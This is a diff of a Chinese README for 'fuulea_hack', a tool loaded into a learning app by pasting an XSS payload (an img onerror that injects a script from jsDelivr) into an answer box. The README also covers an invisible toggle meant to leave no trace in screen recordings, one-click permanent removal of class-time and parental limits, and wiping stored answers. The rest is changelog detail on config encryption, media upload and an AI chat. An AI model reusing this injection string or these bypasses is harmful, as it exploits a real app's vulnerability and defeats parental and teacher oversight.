@@ -7,7 +7,7 @@
 贴进「注释填空」的输入框，随便答错提交：
 
 ```html
-<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.7/loader.js'">
+<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.8/loader.js'">
 ```
 
 154 字符，输入框没有长度限制，直接粘贴即可。面板出现在右下角。**再注入一次就是隐形开关**：面板开着时注入 → 整块隐藏；再注入 → 显形。藏起来时页面里只剩你原本的内容，录屏、投屏都不留痕迹。
@@ -27,6 +27,14 @@
 > 为什么不用 GitLab `/-/raw/`：它返回 `text/plain` + `nosniff`，`<script>` 标签拒执行。jsDelivr 走 GitHub 并给正确的 JS MIME，所以当主源。
 >
 > `cdn.jsdelivr.net` 在国内常被重置，所以注入串默认用 `fastly.jsdelivr.net`；loader 自身与模块加载会按 `cdn` → `fastly` → `gcore` → raw.githubusercontent → GitLab API 依次重试。
+
+## v3.8
+
+- **聊天室彻底独立**：主面板「💬 聊天室（共享）」改为加载独立的 `mods/room.js`，不再顺带打开 AI 网页；聊天室有自己的窗口、Markdown / LaTeX 渲染、GitLab `message/` 读取、30 秒轮询、拖动 / 缩放 / 全屏 / Esc 关闭，位置大小仍记在 `fh:ai:roomRect`。未登录只能看本机缓存并提示登录，未配置 Token 时不能同步或发送。
+- **AI 底部显示用量和速率**：新增一行 9px 小字，累计本会话输入 / 输出 token（按会话存 `fh:ai:usage:<sid>`），并显示本轮 `tok/s`；输入按每轮上下文重新计费，所以会大于实际字数。
+- **余额显示**：仅当 API 地址是 DeepSeek 官方域名时，用 Key 请求 `https://api.deepseek.com/user/balance`，显示人民币余额；取不到（代理、401、跨域、断网）显示 `余额 --` 占位，点一下可重试，不会把 Key 发给第三方域名。
+- **media 按用户分目录**：AI 图片上传和相机 / 文件模块统一写到 `media/<用户名>/<时间>-<随机>.<ext>`；未登录写 `media/guest/`。用户名会去掉路径分隔符等非法字符并截到 40 字。
+- 版本号 `TAG` / AI 头栏 / 主面板标签统一升到 3.8；聊天室模块从 `mods/ai.js` 拆到 `mods/room.js`。
 
 ## v3.7
 
@@ -68,14 +76,14 @@
 ## v3.3
 
 - 修注入串：`mods/test.js` 与 README 改回绝对地址 `https://fastly.jsdelivr.net/...`（原来把 `https:` 剥成 `//`，在 `file://` 页面里会变成 `file://fastly...`，新设备直接加载失败）。
-- 新增 ☁ 配置上传 / 下载（工具页）：把本机所有 `fh:*` 配置（API Key 除外，密码/会话/缓存/模型源码除外）加密成一个文件，提交到公开仓库 `config/<id>.json`；换设备或清缓存后输入 PIN 即可找回。配置按用户隔离，同一仓库可以存多份。
+- 新增 ☁ 配置上传 / 下载（工具页）：把本机所有 `fh:*` 配置（API Key 除外，密码/会话/缓存/用量/模型源码除外）加密成一个文件，提交到公开仓库 `config/<id>.json`；换设备或清缓存后输入 PIN 即可找回。配置按用户隔离，同一仓库可以存多份。
   - 首次「⬆ 上传配置」：填 GitLab Token + 设置 PIN（6-30 位）+ 可选管理员密钥；之后「⬇ 更新配置」只需要 PIN，Token 会被加密保存在配置里、自动取用。
   - 每个配置文件用随机 256 位会话密钥加密（AES-GCM），会话密钥分别用 PIN、Token、管理员密钥包裹（PBKDF2-SHA256 15 万次）。PIN 本身不落盘，仓库里只有包裹后的信封。
   - **忘记 PIN**：配置弹窗里有「忘记 PIN」，用上传时的 Token 或管理员密钥解包并重置 PIN（配置内容与 ID 不变，只换 PIN 信封）。仓库管理员也可用 `recover.html` 或 GitLab CI 的 `reset-pin` 手动任务重置。
   - 清缓存后首次打开插件，若云端已有配置，会弹一条可点击的提示「☁ 云端有 N 份配置，点此输入 PIN 恢复」。
 - 主面板重排：学习（改名 / 积分 / 灵宠 / 宠物图 / 加宠物 / 解锁4只）、工具（网页 / 相机 / 文件 / 小说 / 音乐 / 图片 / 转印 / 存档 / 遮罩 / 名单 / 清答案 / 上传配置 / 更新配置 / 解除限时 / 清空）、chat（AI 网页）、白板（占位按钮，功能开发中）、便签。
 - AI 网页（chat）：拍照改为网页相机（`getUserMedia`，不走系统相机），支持前后摄像头切换；不可用时才降级为文件选择。附件栏在设置过 GitLab Token 后多一个「上传至 GitLab 仓库」勾选项。
-- 相机 / 文件（`mods/media.js`）：设置过 GitLab Token 时，查看媒体窗口顶栏出现 ⬆，可把当前图片/视频直接上传到仓库 `media/`。
+- 相机 / 文件（`mods/media.js`）：设置过 GitLab Token 时，查看媒体窗口顶栏出现 ⬆，可把当前图片/视频直接上传到仓库 `media/<用户名>/`（未登录为 `media/guest/`）。
 - 网页（`mods/embed.js`）：每个网页窗口顶栏最左新增「←」，关闭当前窗口并回到上一个打开的网页；没有上一个时按钮置灰。
 
 ## v3.2.1
@@ -92,7 +100,7 @@
 ## v3.1
 
 - AI 网页全屏（⛶）；API Key / 上传 Token 保存后只显示「前 7 位 + 后 5 位」，之后不再回显完整密钥，只能点「修改」覆盖。
-- 拍照 / 选图：本地压缩后随消息发送；可勾选自动上传 GitLab `media/`；同时把原图存进本机 IndexedDB 相册。
+- 拍照 / 选图：本地压缩后随消息发送；可勾选自动上传 GitLab `media/<用户名>/`（未登录 `media/guest/`）；同时把原图存进本机 IndexedDB 相册。
 - 支持 OpenAI Responses 接口（`POST /v1/responses`），在「接口」里切换 Chat Completions / Responses（两者都支持流式与思考过程）。
 - 自定义模型：可手填，也可点「扫描」从 `GET /models` 拉取列表（最多 300 个，存本机）。
 - 自定义 API 地址：兼容中转站，自动补 `/v1` 与 `/chat/completions` / `/responses`，扫描时自动推导 `/models`。
@@ -111,9 +119,9 @@
 | 按钮 | 文件 | 作用 |
 |---|---|---|
 | 🤖 AI 网页 | `mods/ai.js` | 全屏、密钥掩码、网页相机拍照 / 相册、多会话、Chat/Responses、模型扫描、探测缓存；多图输入（≤9 张）+ 图片缩放 |
-| 💬 聊天室（共享） | `mods/ai.js` | 主面板 chat 组入口，直接开聊天室；消息写 GitLab `message/`，30 秒轮询 + 本机缓存 |
+| 💬 聊天室（共享） | `mods/room.js` | 独立窗口（不打开 AI），消息写 GitLab `message/`，30 秒轮询 + 本机缓存；拖动 / 缩放 / 全屏 |
 | 👤 账号 | `loader.js` | 用户名 + PIN 登录（本机持久）；AI Key / Token / 网页配置按账号保存 |
-| ⬆ 上传配置 | `loader.js` | 本机 `fh:*` 配置加密上传到私有仓库 `yq-group2/fuulea_ai_repository` 的 `config/<id>.json`（除 API Key / 会话 / 缓存）；PIN 自动生成并保存在本机 |
+| ⬆ 上传配置 | `loader.js` | 本机 `fh:*` 配置加密上传到私有仓库 `yq-group2/fuulea_ai_repository` 的 `config/<id>.json`（除 API Key / 会话 / 缓存 / 用量）；PIN 自动生成并保存在本机 |
 | ⬇ 更新配置 | `loader.js` | 本机有 PIN 时静默恢复，换设备先输入读权限 Token 再输 PIN |
 | 🔄 版本更新 | `mods/update.js` | 查最新版本、校验 CDN、复制纯注入串或「版本vX.Y + 注入串」、刷新本机缓存 |
 | ◐ 透明度 | `loader.js` | 主面板与模块窗口 5%–100%，标题栏保持可操作 |
@@ -124,7 +132,7 @@
 | 🧹 清答案 | `mods/clean.js` | 删错题本里存的答题原文 `yourAns` |
 | 🖼 图片 | `mods/img.js` | 直链图片全屏弹窗 |
 | 🌐 网页 | `mods/embed.js` | 网址 iframe 弹窗；顶栏「←」回到上一个网页（受对方 X-Frame-Options 限制） |
-| 📷 相机 / 📂 文件 | `mods/media.js` | 网页相机拍照录像 / 本地媒体查看；有 Token 时可 ⬆ 上传到 GitLab `media/` |
+| 📷 相机 / 📂 文件 | `mods/media.js` | 网页相机拍照录像 / 本地媒体查看；有 Token 时可 ⬆ 上传到 GitLab `media/<用户名>/` |
 | 📦 存档 | `mods/dump.js` | 展示并复制完整 `state` JSON |
 | 💣 清空 | `mods/reset.js` | 清 `wycg_v3` + `wycg_rank_v1` |
 | ⏱ 解除限时 | `loader.js` | 一键永久解除上课时段 / 周末 / 20 分钟配额 |
@@ -148,7 +156,7 @@
 
 - `DK` 是每份配置随机的 256 位密钥；PIN / Token / 管理员密钥只用来包裹 `DK`，都不落盘。
 - 配置 ID 与 PIN 无关：重置 PIN 不改文件名，旧 PIN 立即失效。
-- `box.keys` 只收 `fh:*`（主题、透明度、网页站点、便签、解除限时标记、AI 地址/模型/思考深度等）；排除 API Key、会话、聊天记录、聊天室缓存、指令历史、`fh:mod:*` 源码缓存、`fh:cfg:*` 自身（含本机 PIN `fh:cfg:pin` / `fh:cfg:pinAt`）。
+- `box.keys` 只收 `fh:*`（主题、透明度、网页站点、便签、解除限时标记、AI 地址/模型/思考深度等）；排除 API Key、会话、聊天记录、聊天室缓存、token 用量、指令历史、`fh:mod:*` 源码缓存、`fh:cfg:*` 自身（含本机 PIN `fh:cfg:pin` / `fh:cfg:pinAt`）。
 - v3.5 起 PIN 由插件生成并保存在本机：上传时若有 Token 就直接用本地 PIN 重写配置，成功页展示一次可复制的 PIN；恢复时先试本机 PIN，失败才弹输入框（换设备 / 清缓存）。每次上传都会换新盐和新的 `wrapPin`，旧 PIN 立即失效。
 - 恢复流程：`pullConfig` → 没有读权限 Token 时先弹 Token（校验 `read_api`）→ 有本机 PIN 直接 `cfgPull(pin)`，否则输入 PIN → 列出 `config/` → 逐个试解 `wrapPin` → 命中即解 `box` → 写回 localStorage（含 `fh:ai:gitToken`）并 `cfgPinSet(pin)`。
 - v3.6 起仓库是私有的（`yq-group2/fuulea_ai_repository`）：上传需要 Developer 及以上的写权限，读取（恢复 / 启动探测）需要 `read_api`。只用于读配置的 Token 存在本机 `fh:cfg:rTok`，恢复成功后会被备份里的真 Token 覆盖并清掉。
@@ -166,7 +174,7 @@
 }
 ```
 
-`localStorage` 键：`wycg_v3`（学习数据）、`wycg_rank_v1`（排行榜）、`wycg_lock_v1`（家长密码）、`fh:lockfree`（本机解除限时标记）；插件自身配置 `fh:*`（主题、主面板透明度、`fh:sites`、`fh:note`、AI 地址/模型/思考深度/Token 等），其中 `fh:ai:key` 永不上传，`fh:cfg:id` / `fh:cfg:at` / `fh:cfg:admKey` 记录本机云端配置状态，`fh:cfg:pin` / `fh:cfg:pinAt` 是本机保存的恢复 PIN（不上传、不再反复询问）；`fh:ai:roomOpen` 只是「从主面板打开聊天室」的一次性开关；`fh:acct` 存账号（用户名 / PIN 哈希 / 账号的 Key、Token、网页配置），同样不上传。
+`localStorage` 键：`wycg_v3`（学习数据）、`wycg_rank_v1`（排行榜）、`wycg_lock_v1`（家长密码）、`fh:lockfree`（本机解除限时标记）；插件自身配置 `fh:*`（主题、主面板透明度、`fh:sites`、`fh:note`、AI 地址/模型/思考深度/Token 等），其中 `fh:ai:key` 永不上传，`fh:cfg:id` / `fh:cfg:at` / `fh:cfg:admKey` 记录本机云端配置状态，`fh:cfg:pin` / `fh:cfg:pinAt` 是本机保存的恢复 PIN（不上传、不再反复询问）；`fh:ai:roomRect` 记聊天室位置大小，`fh:room:cache` 是聊天室消息缓存（最多 200 条），`fh:ai:usage:<sid>` 记每个会话的 token 累计；`fh:acct` 存账号（用户名 / PIN 哈希 / 账号的 Key、Token、网页配置），同样不上传。
 
 ## 注意
 
